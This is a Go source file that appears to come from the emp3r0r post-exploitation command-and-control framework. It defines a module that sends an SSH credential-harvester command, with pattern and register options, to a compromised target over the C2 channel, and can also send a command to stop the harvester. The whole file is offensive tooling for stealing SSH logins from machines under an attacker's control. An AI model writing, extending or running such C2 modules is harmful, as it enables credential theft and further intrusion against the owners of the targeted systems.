package modules

import (
	"fmt"
	"strconv"

	c2context "github.com/jm33-m0/emp3r0r/core/internal/cc/context"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

func module_ssh_harvester(ctx *c2context.C2Context) {
	if ctx.Target == nil {
		logging.Errorf("CurrentTarget is nil")
		return
	}
	code_pattern_opt, ok := ctx.Flags["code_pattern"]
	if !ok {
		logging.Errorf("code_pattern not specified")
		return
	}

	reg_name_opt, ok := ctx.Flags["reg_name"]
	if !ok {
		logging.Errorf("reg_name not specified")
	}
	cmd := fmt.Sprintf("%s --code_pattern %s --reg_name %s",
		def.C2CmdSSHHarvester, strconv.Quote(code_pattern_opt), strconv.Quote(reg_name_opt))
	stop_opt, ok := ctx.Flags["stop"]
	if ok {
		if stop_opt == "yes" {
			cmd = fmt.Sprintf("%s --stop", def.C2CmdSSHHarvester)
		}
	}
	err := CmdSender(cmd, "", ctx.Target.Tag)
	if err != nil {
		logging.Errorf("SendCmd: %v", err)
		return
	}
}
